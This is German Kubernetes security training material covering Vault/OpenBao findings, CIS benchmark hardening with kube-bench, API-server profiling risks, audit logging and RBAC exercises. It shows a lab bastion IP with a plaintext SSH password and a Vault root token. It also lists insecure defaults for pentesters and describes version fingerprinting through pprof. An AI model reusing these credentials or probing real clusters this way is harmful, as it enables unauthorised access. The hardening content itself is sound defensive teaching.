**Access Points:**
- **Vault UI**: `http://<LoadBalancer-IP>:8200` (token: `myroot`)
- **Application**: `http://<webapp-service-LoadBalancer-IP>`

**Project Location:** `~/vault-k8s-exercise/`

This exercise demonstrates a complete workflow from Vault installation to secret consumption in applications using modern Kubernetes-native approaches!

### Info: OpenBao/Hashicorp Vault - Sicherheitsrelevante Findings


### ✅ Sichere Defaults (Pentester findet hier nichts)

**VSO Helm Chart:**
- Client-Cache nur in-memory (`persistenceModel: none`) — keine Tokens auf Disk
- TLS-Verify aktiv (`skipTLSVerify: false`)
- CSI-Driver deaktiviert
- kube-rbac-proxy für Metrics aktiv
- Kein Default-`VaultAuth` — Admin muss explizit anlegen
- `allowedNamespaces` leer = nur eigener Namespace

**Vault/OpenBao K8s-Auth (frische Installation):**
- `disable_iss_validation: true` (seit Vault 1.9 für neue Mounts)
- `disable_local_ca_jwt: false`
- TLS zwischen Operator und Vault Pflicht

### ❌ Unsichere Defaults (low-hanging fruit)

**Vault/OpenBao Server:**
- **Kein Audit-Device aktiv** → keine Forensik möglich
- **Root-Token bleibt gültig** nach `vault operator init`
- **Token-TTL = 0** → System-Max greift (~32 Tage), viel länger als Pod-Lebensdauer
- **Vault ≤ 1.12**: Audience-Parameter wird komplett ignoriert (Bug)

**K8s-Auth Rollen-Konfiguration:**
- `bound_service_account_names: ["*"]` und `bound_service_account_namespaces: ["*"]` sind erlaubte Werte → Wildcard öffnet alles
- `audience` historisch optional → erst ab Vault 1.21 Pflicht für neue Rollen

### ⚠️ Migrations-Altlasten (kein Default, aber häufig)

- Rollen **vor Vault 1.21** ohne `audience` → wird in Logs gewarnt, aber funktioniert noch
- Admin aktiviert Cache-Persistence und nimmt `direct-unencrypted` aus Tutorial → Tokens im Klartext in K8s Secrets

### Pentester-Faustregel

VSO selbst ist **per Default konservativ** — Findings entstehen fast immer durch Admin-Konfiguration (Policies, Rollen, Audit). Vault-Server hingegen liefert **mehrere unsichere Defaults** (kein Audit, Root-Token, lange TTLs), die bei jedem nicht-gehärteten Setup als Finding gelten.

## Kubernetes - Storage / CSI

### CSI - Überblick und Vorteile


```
11.1 Why CSI 

Each vendor can create his own driver for his storage 

11.2 Advantages:

I. Automatically create storage when required.
II. Make storage available to containers wherever they're scheduled.
III. Automatically delete the storage when no longer needed. 

11.3 Before 

Vendor needed to wait till his code was checked in in tree of kubernetes.

11.3.5. Unterschied statisch, dynamisch.

The main difference relies on the moment when you want to configure storage. For instance, if you need to pre-populate data in a volume, you choose static provisioning. Whereas, if you need to create volumes on demand, you go for dynamic provisioning.

```

### CSI Treiber Liste

  * https://kubernetes-csi.github.io/docs/drivers.html

### Übung: NFS mit CSI-Treiber (Schritt 3+4)

## Trainingszugänge / Clusterumgebung

### Clusterumgebung & Zugänge (Bastion, ssh cp, ssh worker, kubectl)


### Überblick

Jeder Teilnehmer hat ein eigenes Kubernetes-Cluster auf DigitalOcean:

| Komponente | Beschreibung |
|------------|-------------|
| Control Plane | 1 Node (`k8s-tln{N}-cp`) |
| Worker | 1 Node (`k8s-tln{N}-w1`) |
| Bastion-Server | `161.35.210.204` |

### Login auf den Bastion-Server

```bash
ssh tln1@161.35.210.204
## Passwort: 11essen22
```

Jeder Teilnehmer nutzt seinen eigenen User (`tln1` bis `tln13`).

### SSH-Zugang zu den eigenen Cluster-Nodes

Nach dem Login auf dem Bastion-Server stehen folgende Shortcuts zur Verfügung:

```bash
## Zum Control Plane Node wechseln
ssh cp

## Zum Worker Node wechseln
ssh worker
```

Die SSH-Konfiguration liegt unter `~/.ssh/config` und ist bereits vorkonfiguriert.

### kubectl

kubectl ist auf dem Bastion-Server direkt nutzbar — die kubeconfig zeigt
automatisch auf das eigene Cluster:

```bash
## Nodes anzeigen
kubectl get nodes

## Ausgabe (Beispiel tln1):
## NAME          STATUS   ROLES           AGE   VERSION
## k8s-tln1-cp   Ready    control-plane   5m    v1.35.4
## k8s-tln1-w1   Ready    <none>          4m    v1.35.4
```

### Übersicht aller Zugänge

```
[Laptop]
    │
    │  ssh tln1@161.35.210.204
    ▼
[Bastion: client-bw]  ──── kubectl ────► [k8s-tln1-cp]
    │                                          │
    │  ssh cp                                  │ (Control Plane)
    ▼                                          │
[k8s-tln1-cp]                                 │
    │                                          ▼
    │  (vom Bastion)                    [k8s-tln1-w1]
    │  ssh worker                       (Worker Node)
    ▼
[k8s-tln1-w1]
```

## Kubernetes - Hardening Überblick

### Kubernetes Versionen & CIS Benchmark Überblick


### Aktuelle Kubernetes Versionen (Stand: 2026)

| Version | Release | Support Ende |
|---------|---------|--------------|
| 1.36 | April 2026 | ~Juni 2027 |
| 1.35 | Dezember 2025 | ~Februar 2027 |
| 1.34 | August 2025 | ~Oktober 2026 |

Empfehlung: immer auf einer der drei aktuellen Minor-Versionen bleiben.  
Release-Zyklus: ca. alle 4 Monate eine neue Minor-Version.

> Der CIS Kubernetes Benchmark V1.12.0 gilt für Kubernetes **v1.32 - v1.34**.

### CIS Benchmark für Kubernetes

Das Center for Internet Security (CIS) veröffentlicht regelmäßig Benchmarks für Kubernetes.

**Aktuelle Version: CIS Kubernetes Benchmark V1.12.0**

Der Benchmark deckt folgende Bereiche ab:
- **Section 1** — Control Plane Components (API Server, Controller Manager, Scheduler, etcd)
- **Section 2** — etcd
- **Section 3** — Control Plane Configuration
- **Section 4** — Worker Nodes (kubelet, kube-proxy)
- **Section 5** — Kubernetes Policies (RBAC, Network Policies, Pod Security)

### CIS Benchmark PDF

Der Trainer stellt das Dokument unter folgendem Link bereit:

**[CIS Kubernetes Benchmark V1.12.0 (PDF)](http://161.35.210.204/CIS_Kubernetes_Benchmark_V1.12.0.pdf)**

### Tool: kube-bench

Für das automatisierte Scannen des Clusters gegen den CIS Benchmark verwenden wir **kube-bench** von Aqua Security:

```
https://github.com/aquasecurity/kube-bench
```

kube-bench führt die CIS Benchmark Checks automatisch durch und gibt eine Übersicht über PASS/FAIL/WARN Ergebnisse.

### Referenzen

  * https://www.cisecurity.org/benchmark/kubernetes
  * https://github.com/aquasecurity/kube-bench
  * https://kubernetes.io/releases/

### CIS Kubernetes Benchmark V1.12.0 - PDF (Link vom Trainer)

  * http://161.35.210.204/CIS_Kubernetes_Benchmark_V1.12.0.pdf

## Kubernetes - Hardening (Control Plane)

### Kap. 1.2.15 - API Server Profiling: Warum nicht in Produktion?


### Was ist Profiling?

Der Kubernetes API-Server ist in Go geschrieben. Go hat ein eingebautes
Profiling-Framework (`pprof`), das Laufzeitdaten des Prozesses über HTTP
bereitstellt. Profiling ist ein **Entwicklungs- und Debugging-Tool** — es
hilft Entwicklern, Speicherlecks, CPU-Hotspots und Deadlocks zu finden.

**Default:** `--profiling=true`

Das bedeutet: in jedem frisch installierten Kubernetes-Cluster ist Profiling
aktiv, ohne dass man etwas konfigurieren muss.

### Wo ist der Endpunkt erreichbar?

```
https://<api-server>:6443/debug/pprof/
```

Mit kubectl direkt abrufbar (kein Extra-Token noetig — der normale kubeconfig reicht):

```
kubectl get --raw /debug/pprof/
```

### Was gibt der Endpunkt preis?

| Endpunkt | Inhalt |
|----------|--------|
| `/debug/pprof/heap` | Speicherbelegung + interne Stack Traces mit Bibliothekspfaden und Versionsnummern |
| `/debug/pprof/goroutine` | Alle laufenden Go-Threads des API-Servers mit Callstacks |
| `/debug/pprof/allocs` | Alle Speicherallokationen seit Prozessstart |
| `/debug/pprof/profile` | 30-Sekunden CPU-Profil (blockiert den Request) |
| `/debug/pprof/trace` | Kompletter Laufzeit-Trace des Prozesses |
| `/debug/pprof/cmdline` | Startparameter des API-Server-Prozesses |

Beispielausgabe von `/debug/pprof/heap`:

```
heap profile: 262: 18177752 [2631: 72114632] @ heap/1048576
## sigs.k8s.io/json@v0.0.0-20250730193827-2d320260d730/...
## k8s.io/apiextensions-apiserver/pkg/apis/apiextensions/v1beta1/marshal.go:204
## k8s.io/apimachinery/pkg/util/json/json.go:46
```

Sichtbar: **exakte Versionsnummern interner Bibliotheken** und **interne
Codepfade** des API-Servers.

### Warum gehoert das nicht in Produktion?

Ein Angreifer mit gueltigem Kubernetes-Token (z.B. aus einem kompromittierten
Pod) kann den Endpunkt abfragen und bekommt:

1. **Versions-Fingerprinting** — exakte Softwareversionen fuer gezielte
   Exploit-Suche (z.B. bekannte CVEs in spezifischen Library-Versionen)

2. **Interne Architektur** — welche Komponenten wie zusammenhaengen,
   Codepfade und interne Ablaeufe

3. **Laufzeit-Zustand** — was der API-Server gerade verarbeitet,
   Speichermuster, Thread-Aktivitaet

4. **CPU-Profil** — Verarbeitungsmuster, die Rueckschluesse auf
   Clusteraktivitaeten erlauben

Das **Prinzip der minimalen Angriffsfläche** (Principle of Least Exposure)
verlangt: was nicht benoetigt wird, wird deaktiviert.

### CIS Benchmark: 1.2.15

```
[FAIL] 1.2.15 Ensure that the --profiling argument is set to false (Automated)

Remediation:
Edit the API server pod specification file
/etc/kubernetes/manifests/kube-apiserver.yaml
and set the below parameter:
--profiling=false
```

### Fix

```
## Auf dem Control Plane Node
nano /etc/kubernetes/manifests/kube-apiserver.yaml
```

Folgende Zeile in der `command`-Liste ergaenzen:

```
- --profiling=false
```

Der API-Server startet als Static Pod automatisch neu — kein manueller
Restart noetig. Nach ca. 30 Sekunden:

```
kubectl cluster-info
## Verbindung wieder hergestellt -> Neustart erfolgreich
```

Endpunkt ist danach nicht mehr erreichbar:

```
kubectl get --raw /debug/pprof/
## Error from server (NotFound): ...
```

### Referenzen

  * https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/
  * https://www.cisecurity.org/benchmark/kubernetes (Sektion 1.2.15)
  * https://pkg.go.dev/net/http/pprof

### Kap. 1 - CIS Benchmark Control Plane: Übung mit kube-bench


### PreChecks / Cleanup 

```
## if you have a job kube-bench from the last exercise -> delete it
kubectl get jobs | grep kube-bench
## Only if it was there 
kubectl delete jobs kube-bench 
```

### Walkthrough

```
## Node-Namen anzeigen
kubectl get nodes

## Taint des Control-Plane-Nodes pruefen
## Hinweis: Node-Name hat das Format k8s-tln<nr>-cp (z.B. k8s-tln1-cp)
kubectl describe node k8s-tln1-cp | grep -i taints
```

```
## Control-Plane schedulable machen
kubectl taint nodes k8s-tln1-cp node-role.kubernetes.io/control-plane:NoSchedule-
kubectl describe node k8s-tln1-cp | grep -i taints
```

```
cd
mkdir -p manifests/kube-bench-cis-cp
cd manifests
cd kube-bench-cis-cp
```

```
wget https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
```

```
## nodeName in template/spec: ergänzen wie folgt
## Hinweis: k8s-tln1-cp durch deinen Node-Namen ersetzen (siehe kubectl get nodes)
spec:
  template:
    spec:
      nodeName: k8s-tln1-cp
      containers:
        - command: ["kube-bench"]
 
```

```
kubectl apply -f job.yaml
kubectl get pods -o wide 
## Durch Euren Pod ersetzen
## kubectl logs kube-bench-j76s9
## Oder: einfacher -> zeigt logs des 1. Pods des jobs
kubectl logs job/kube-bench
```

```
## Ausgabe
[INFO] 1 Master Node Security Configuration
[INFO] 1.1 API Server
```

```
kubectl logs job/kube-bench > report.txt
```

### Beispiel für Fehlerbehebung auf Node (anonymous auth)

#### FAIL: 

```
[FAIL] 1.2.15 Ensure that the --profiling argument is set to false (Automated)
```

```
## Remediations
1.2.15 Edit the API server pod specification file /etc/kubernetes/manifests/kube-apiserver.yaml
on the control plane node and set the below parameter.
--profiling=false
```

#### Fix: Walkthrough 

```
## Auf den Control-Plane-Node wechseln
ssh cp
```

```
cd /etc/kubernetes/manifests/
nano kube-apiserver.yaml
```

```
## changes from cis-scan 
- --profiling=false  # ergänzen
```

```
kubectl cluster-info
kubectl -n kube-system get pods
kubectl -n kube-system describe pods kube-apiserver
```

```
exit
```


#### After Fix: Walkhrough 

```
kubectl delete -f job.yaml
kubectl apply -f job.yaml
kubectl logs job/kube-bench > report-afterfix.txt
diff report.txt report-afterfix.txt
```

```
[PASS] 1.2.15 Ensure that the --profiling argument is set to false (Automated)
```

### Make it non-scheduable again 

```
kubectl taint nodes k8s-tln1-cp node-role.kubernetes.io/control-plane:NoSchedule
```


### Reference:

  * https://hub.docker.com/r/aquasec/kube-bench
  * https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/

## Kubernetes - Audit Logging

### Kap. 3.2 - API Server Audit Logging aktivieren und auswerten


### Hintergrund

Kubernetes Audit Logging zeichnet alle Anfragen an den API-Server auf — wer hat was wann gemacht. Das ist wichtig für Compliance, Forensik und Sicherheitsmonitoring.

**Audit Levels:**

| Level | Was wird geloggt |
|-------|------------------|
| `None` | Nichts |
| `Metadata` | Nur Metadaten (User, Zeitstempel, Ressource) |
| `Request` | Metadaten + Request Body |
| `RequestResponse` | Metadaten + Request + Response Body |

**Warum diese Policy-Struktur?**

Die Audit Policy filtert gezielt — nicht alles muss mit gleichem Detail geloggt werden:

| Ressource | Level | Warum |
|-----------|-------|-------|
| `secrets`, `configmaps` | `Metadata` | Nur WER/WANN/WAS — nicht WAS DRIN STEHT. Mit `RequestResponse` würden Passwörter und Tokens im Klartext ins Log geschrieben. |
| `pods` | `RequestResponse` | Forensisch wertvoll: Bei einem Incident will man genau wissen, welcher Container mit welchem Image und welchen Env-Vars erstellt wurde. |
| kube-proxy `watch` | `None` | kube-proxy aktualisiert iptables-Regeln — dutzende Male pro Minute, 24/7. Würde das Log fluten ohne jeden Sicherheitswert. |
| node `get` | `None` | Jedes kubelet fragt regelmäßig seinen Node-Status ab. Tausende Einträge pro Stunde, null forensischer Wert. |
| `events` | `None` | Kubernetes-interne Statusmeldungen (Pod startet, crasht…) — kein Zugriffsaudit-Wert. |
| Alles andere | `Metadata` | Sicherheitsnetz: Man weiß, dass ein User um 14:32 ein Secret gelesen hat — ohne den Inhalt zu sehen. |

Das `omitStages: [RequestReceived]` verhindert doppelte Einträge: ohne es würde jede Anfrage zweimal geloggt (beim Empfang und beim Antworten).

### Schritt 1: Aktuellen Zustand prüfen

```
## Vom Bastion-Server aus: auf Control Plane wechseln
ssh cp
```

```
## Läuft Audit Logging bereits?
ls -la /var/log/kubernetes/audit/ 2>/dev/null || echo "Kein Audit Logging aktiv"
```

Erwartete Ausgabe (ohne Audit Logging):
```
Kein Audit Logging aktiv
```

### Schritt 2: Audit Log-Verzeichnis und Policy erstellen

```
## Verzeichnis für Audit Logs anlegen
mkdir -p /var/log/kubernetes/audit
```

```
## Audit Policy in das bereits im API-Server gemountete pki-Verzeichnis legen
## WICHTIG: Nicht /etc/kubernetes/audit-policy.yaml verwenden — das Verzeichnis
## ist im API-Server-Container nicht gemountet!
cat > /etc/kubernetes/pki/audit-policy.yaml << 'EOF'
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # Secrets und ConfigMaps: nur Metadaten (kein Inhalt — enthält Passwörter!)
  - level: Metadata
    omitStages:
      - RequestReceived
    resources:
      - group: ""
        resources: ["secrets", "configmaps"]

  # Pods: vollständig loggen (Request + Response) für forensische Analyse
  - level: RequestResponse
    omitStages:
      - RequestReceived
    resources:
      - group: ""
        resources: ["pods"]

  # kube-proxy watches ausblenden — sehr häufig, kein Sicherheitswert
  - level: None
    users: ["system:kube-proxy"]
    verbs: ["watch"]
    resources:
      - group: ""
        resources: ["endpoints", "services", "services/status"]

  # Node gets ausblenden — Routine-Kubelet-Anfragen
  - level: None
    userGroups: ["system:nodes"]
    verbs: ["get"]
    resources:
      - group: ""
        resources: ["nodes", "nodes/status"]

  # Events komplett ignorieren
  - level: None
    resources:
      - group: ""
        resources: ["events"]

  # Alles andere: Metadaten (wer, wann, was — ohne Inhalte)
  - level: Metadata
    omitStages:
      - RequestReceived
EOF
```

```
## Policy prüfen
cat /etc/kubernetes/pki/audit-policy.yaml | head -5
```

### Schritt 3: Kube-Apiserver Manifest sichern und anpassen

```
## Backup ins Home-Verzeichnis (NICHT ins manifests-Verzeichnis!)
## Wichtig: Backups in /etc/kubernetes/manifests/ werden von kubelet
## als weitere Static-Pod-Manifeste erkannt und verursachen Konflikte!
cp /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml.orig
```

```
## Manifest bearbeiten
nano /etc/kubernetes/manifests/kube-apiserver.yaml
```

Im Abschnitt `spec.containers[0].command` nach dem letzten `--tls-...` Eintrag einfügen:

```
    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
    - --audit-log-path=/var/log/kubernetes/audit/audit.log
    - --audit-log-maxage=30
    - --audit-log-maxbackup=10
    - --audit-log-maxsize=100
    - --audit-policy-file=/etc/kubernetes/pki/audit-policy.yaml
```

Im Abschnitt `spec.containers[0].volumeMounts` ergänzen:

```
    - mountPath: /var/log/kubernetes/audit
      name: audit-log
```

Im Abschnitt `spec.volumes` ergänzen:

```
  - hostPath:
      path: /var/log/kubernetes/audit
      type: DirectoryOrCreate
    name: audit-log
```

### Schritt 4: Auf den Neustart warten

Der Kubelet erkennt die Manifest-Änderung automatisch und startet den API-Server neu. Das dauert ca. 30–60 Sekunden.

```
## Warten bis der API-Server wieder antwortet
watch -n2 "kubectl --kubeconfig /etc/kubernetes/admin.conf get nodes"
```

```
## Verifizieren: Audit-Flags im laufenden Prozess
pgrep -a kube-apiserver | grep -o -- "--audit-log-path[^ ]*"
```

Erwartete Ausgabe:
```
--audit-log-path=/var/log/kubernetes/audit/audit.log
```

### Schritt 5: Audit Log verifizieren

```
ls -la /var/log/kubernetes/audit/
```

```
## Erste Einträge anzeigen (JSON-Format)
tail -3 /var/log/kubernetes/audit/audit.log
```

```
## Anzahl der Log-Einträge
wc -l /var/log/kubernetes/audit/audit.log
```

### Schritt 6: Events erzeugen und analysieren

```
## Zurück auf den Bastion-Server
exit
```

```
## Aktionen ausführen um Events zu erzeugen
kubectl get secrets -A
kubectl create namespace audit-test
kubectl delete namespace audit-test
```

```
## Wieder auf den Control Plane
ssh cp
```

### Schritt 7: Log-Analyse mit jq

```
## jq installieren falls nicht vorhanden
apt-get install -y jq 2>/dev/null || true
```

```
## Alle Zugriffe auf Secrets (nur Metadaten — Inhalte sind geschützt)
cat /var/log/kubernetes/audit/audit.log | jq -r 'select(.objectRef.resource=="secrets") | "\(.stageTimestamp) \(.user.username) \(.verb) \(.objectRef.namespace)/\(.objectRef.name)"' | tail -10
```

```
## Namespace-Erstellungen finden
cat /var/log/kubernetes/audit/audit.log | jq -r 'select(.objectRef.resource=="namespaces" and .verb=="create") | "\(.stageTimestamp) CREATE NS: \(.objectRef.name) by \(.user.username)"'
```

```
## Alle Aktionen von kubectl-Usern (nicht System-Komponenten)
cat /var/log/kubernetes/audit/audit.log | jq -r 'select(.user.username | startswith("system:") | not) | "\(.stageTimestamp) [\(.user.username)] \(.verb) \(.objectRef.resource)/\(.objectRef.name)"' | tail -15
```

```
## Fehlgeschlagene Requests (4xx, 5xx)
cat /var/log/kubernetes/audit/audit.log | jq -r 'select(.responseStatus.code >= 400) | "HTTP\(.responseStatus.code) \(.user.username) \(.verb) \(.objectRef.resource)/\(.objectRef.name)"' | tail -10
```

```
## Verb-Statistik: Was wird am häufigsten gemacht?
cat /var/log/kubernetes/audit/audit.log | jq -r '.verb' | sort | uniq -c | sort -rn
```

### Aufräumen: Audit Logging deaktivieren

```
## Auf dem Control Plane:
## Original Manifest wiederherstellen
cp /root/kube-apiserver.yaml.orig /etc/kubernetes/manifests/kube-apiserver.yaml
```

```
## Warten bis API-Server neu gestartet ist
watch -n2 "kubectl --kubeconfig /etc/kubernetes/admin.conf get nodes"
```

```
## Prüfen: Audit Logging deaktiviert
pgrep -a kube-apiserver | grep -c audit-log || echo "Audit Logging deaktiviert"
```

```
## Optionales Aufräumen
rm -f /etc/kubernetes/pki/audit-policy.yaml
rm -rf /var/log/kubernetes/audit/
```

```
## Zurück auf den Bastion-Server
exit
```

### Referenzen

  * https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
  * https://kubernetes.io/docs/reference/config-api/apiserver-audit.v1/
  * [CIS Kubernetes Benchmark V1.12.0 - PDF (Link vom Trainer)](http://161.35.210.204/CIS_Kubernetes_Benchmark_V1.12.0.pdf) → Abschnitt 3.2

## Kubernetes - Hardening (Worker Nodes)

### Kap. 4 - CIS Benchmark Worker Node: Übung mit kube-bench


### Walkthrough

```
cd
mkdir -p manifests/kube-bench-cis 
cd manifests
cd kube-bench-cis
```

```
wget https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
```

```
## nodeName in template/spec: ergänzen wie folgt
spec:
  template:
    spec:
      nodeName: k8s-tln1-w1
      containers:
        - command: ["kube-bench"]
 
```

```
kubectl apply -f job.yaml
kubectl get pods -o wide 
## Durch Euren Pod ersetzen
## kubectl logs kube-bench-j76s9
## Oder: einfacher -> zeigt logs des 1. Pods des jobs
kubectl logs job/kube-bench
```

```
## Ausgabe
[INFO] 1 Master Node Security Configuration
[INFO] 1.1 API Server
```

```
kubectl logs job/kube-bench > report.txt
```

### Beispiel für Fehlerbehebung auf Node 

#### FAIL: 

```
[FAIL] 4.1.1 Ensure that the kubelet service file permissions are set to 600 or more restrictive (Automated)
```

```
## Remediations
4.1.1 Run the below command (based on the file location on your system) on the each worker node.
For example, chmod 600 /lib/systemd/system/kubelet.service
```

#### Fix: Walkthrough 

```
## Auf den Worker-Node wechseln
ssh worker
```

```
find /lib -name "kubelet.service"
find /usr/lib -name "kubelet.service"
```

```
chmod -R 600 /usr/lib/systemd/system/kubelet.service*

## Zur Überprüfung ob Rechteänderung auch für kubelet.service.d/kubeadm.conf
## gut ist -> weil wieder hochfährt 
systemctl restart kubelet
## ist er neu gestartet ?
systemctl status kubelet 
```
```
exit
```


#### After Fix: Walkhrough 

```
kubectl delete -f job.yaml
kubectl apply -f job.yaml
kubectl logs job/kube-bench > report-afterfix.txt
diff report.txt report-afterfix.txt
```

```
[PASS] 4.1.1 Ensure that the kubelet service file permissions are set to 600 or more restrictive (Automated)
```

### Reference:

  * https://hub.docker.com/r/aquasec/kube-bench

## Kubernetes - RBAC Hardening

### Kap. 5.1 - RBAC Grundlagen: Roles, Bindings, Subjects, Verbs


### Was ist RBAC?

**Role-Based Access Control (RBAC)** steuert, wer was im Kubernetes-Cluster darf.
Seit Kubernetes 1.8 ist RBAC standardmaessig aktiviert und der einzige empfohlene
Autorisierungsmechanismus.

Jede Anfrage an den API-Server durchlaeuft drei Stufen:

```
Anfrage --> Authentifizierung --> Autorisierung (RBAC) --> Admission Control --> etcd
```

---

### Die 4 RBAC-Objekte

| Objekt | Scope | Beschreibung |
|--------|-------|--------------|
| `Role` | Namespace | Definiert Rechte innerhalb eines Namespaces |
| `ClusterRole` | Cluster-weit | Definiert Rechte cluster-weit (oder als Vorlage fuer Namespaces) |
| `RoleBinding` | Namespace | Verknuepft eine Role oder ClusterRole mit einem Subjekt im Namespace |
| `ClusterRoleBinding` | Cluster-weit | Verknuepft eine ClusterRole cluster-weit mit einem Subjekt |

**Faustregel:** Roles definieren *was* erlaubt ist. Bindings legen fest *wer* es darf.

---

### Subjekte: Wer kann Rechte bekommen?

| Typ | Beispiel | Beschreibung |
|-----|---------|--------------|
| `User` | `alice` | Kubernetes-User (extern verwaltet, z.B. via Zertifikate) |
| `Group` | `system:masters` | Gruppe von Usern |
| `ServiceAccount` | `default` | In-Cluster Identitaet fuer Pods und Workloads |

Kubernetes verwaltet **keine** eigene User-Datenbank.  
User werden ueber externe Mechanismen identifiziert (Zertifikate, OIDC, Tokens).  
ServiceAccounts dagegen sind echte Kubernetes-Objekte und leben in einem Namespace.

---

### Aufbau einer Role

Eine Role besteht aus **Rules** — jede Rule hat drei Felder:

```
## vi role-example.yml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-reader
  namespace: mein-namespace
rules:
- apiGroups: [""]        # "" = core API group (pods, services, secrets, ...)
  resources: ["pods"]
  verbs: ["get", "list", "watch"]
```

#### apiGroups

| apiGroup | Ressourcen |
|----------|-----------|
| `""` (leer) | pods, services, secrets, configmaps, namespaces |
| `apps` | deployments, replicasets, daemonsets, statefulsets |
| `batch` | jobs, cronjobs |
| `rbac.authorization.k8s.io` | roles, rolebindings, clusterroles |
| `networking.k8s.io` | ingresses, networkpolicies |

#### Verbs

| Verb | Entspricht |
|------|-----------|
| `get` | Einzelne Ressource lesen |
| `list` | Alle Ressourcen auflisten |
| `watch` | Aenderungen beobachten |
| `create` | Neue Ressource erstellen |
| `update` | Ressource aendern |
| `patch` | Ressource teilweise aendern |
| `delete` | Ressource loeschen |
| `*` | Alles erlaubt (CIS-Warnung: vermeiden!) |

---

### RoleBinding: Role + Subjekt verbinden

```
## vi rolebinding-example.yml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: alice-pod-reader
  namespace: mein-namespace
subjects:
- kind: User
  name: alice
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io
```

---

### Scope: Namespace vs. Cluster

```
Role + RoleBinding
  --> Zugriff NUR im angegebenen Namespace

ClusterRole + ClusterRoleBinding
  --> Zugriff auf alle Namespaces + nicht-namespaced Ressourcen (Nodes, PVs)

ClusterRole + RoleBinding  (Kombination moeglich!)
  --> ClusterRole als Vorlage, Zugriff nur im Namespace des RoleBindings
```

#### Nicht-namespaced Ressourcen (benoetigen ClusterRole)

```
kubectl api-resources --namespaced=false
```

Beispiele: `nodes`, `persistentvolumes`, `clusterroles`, `namespaces`

---

### Berechtigungen pruefen

Eigene Rechte pruefen:

```
kubectl auth can-i get pods -n mein-namespace
```

Rechte eines anderen Subjekts pruefen (`--as`):

```
kubectl auth can-i get secrets \
  --as=system:serviceaccount:mein-namespace:mein-sa \
  -n mein-namespace
```

Vollstaendige Uebersicht:

```
kubectl auth can-i --list \
  --as=system:serviceaccount:mein-namespace:mein-sa \
  -n mein-namespace
```

---

### Beispiel: ServiceAccount fuer eine App

```
                +------------------+
                |  ServiceAccount  |   (Identitaet des Pods)
                |  app-reader      |
                +------------------+
                         |
                         | RoleBinding
                         |
                +------------------+
                |      Role        |   (Was ist erlaubt?)
                |  pod-reader      |
                |  verbs: get,list |
                |  resources: pods |
                +------------------+
```

Der Pod laeuft mit dem ServiceAccount `app-reader` und darf nur Pods lesen —
kein Zugriff auf Secrets, keine Schreibrechte, kein anderer Namespace.

---

### Haeufige Fallen

| Problem | Risiko | CIS |
|---------|--------|-----|
| `cluster-admin` fuer normale Apps | Kompletter Cluster-Zugriff | 5.1.1 |
| Wildcard-Verbs (`*`) | Unbeabsichtigte Rechte | 5.1.3 |
| `default` SA mit Rechten | Jeder Pod im Namespace hat Zugriff | 5.1.5 |
| `automountServiceAccountToken: true` | Token in Pod auch wenn nicht benoetigt | 5.1.6 |
| `system:masters` Gruppe | Umgeht RBAC vollstaendig | 5.1.7 |

---

### Referenzen

  * https://kubernetes.io/docs/reference/access-authn-authz/rbac/
  * https://www.cisecurity.org/benchmark/kubernetes (Sektion 5.1)
  * https://github.com/FairwindsOps/rbac-lookup

### Kap. 5.1 - RBAC Nutzer anlegen und als zweites kubectl-Profil einrichten


### Hintergrund

In der Praxis greifen verschiedene Personen oder Systeme auf denselben Cluster zu —
jeder mit eigenen Rechten. Dieses Beispiel zeigt den vollstaendigen Weg:

1. ServiceAccount + Token anlegen
2. Rolle und Binding definieren (Least Privilege)
3. Token als zweites Profil in kubeconfig eintragen
4. Context wechseln und Rechte verifizieren
5. Zurueck zum Admin-Context

> Ab Kubernetes 1.25 werden Tokens **nicht** mehr automatisch beim Anlegen eines
> ServiceAccounts erstellt. Das Secret mit dem Token muss manuell mit einer
> Annotation angelegt werden.

---

### Schritt 1: Vorbereitung

```
cd
mkdir -p manifests/rbac-user
cd manifests/rbac-user
```

---

### Schritt 2: ServiceAccount und Token-Secret anlegen

```
## vi 01-serviceaccount.yml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: training<nr>
  namespace: default
```

```
## vi 02-secret.yml
apiVersion: v1
kind: Secret
type: kubernetes.io/service-account-token
metadata:
  name: trainingtoken<nr>
  namespace: default
  annotations:
    kubernetes.io/service-account.name: training<nr>
```

```
kubectl apply -f .
```

Token wurde erzeugt?

```
kubectl get secret trainingtoken<nr> -o jsonpath='{.data.token}' | base64 --decode | head -c 50
```

Wenn eine JWT-Zeichenkette erscheint: Token ist da.

---

### Schritt 3: ClusterRole mit minimalen Rechten definieren

```
## vi 03-clusterrole.yml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: pods-clusterrole<nr>
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "watch", "list", "create"]
```

```
kubectl apply -f 03-clusterrole.yml
```

---

### Schritt 4: ClusterRole per RoleBinding dem ServiceAccount zuweisen

RoleBinding statt ClusterRoleBinding — Zugriff nur im `default`-Namespace:

```
## vi 04-rolebinding.yml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: rolebinding-default-pods<nr>
  namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: pods-clusterrole<nr>
subjects:
- kind: ServiceAccount
  name: training<nr>
  namespace: default
```

```
kubectl apply -f 04-rolebinding.yml
```

---

### Schritt 5: Rechte pruefen (ohne Context-Wechsel)

```
kubectl auth can-i get pods -n default \
  --as system:serviceaccount:default:training<nr>
```

```
yes
```

```
kubectl auth can-i get deployments -n default \
  --as system:serviceaccount:default:training<nr>
```

```
no
```

Pods: erlaubt. Deployments: verboten. Least Privilege funktioniert.

---

### Schritt 6: Token auslesen und als zweites kubectl-Profil eintragen

Token in Variable laden:

```
TOKEN=$(kubectl get secret trainingtoken<nr> \
  -o jsonpath='{.data.token}' | base64 --decode)
echo $TOKEN
```

Neuen Context und Credentials in die kubeconfig eintragen.
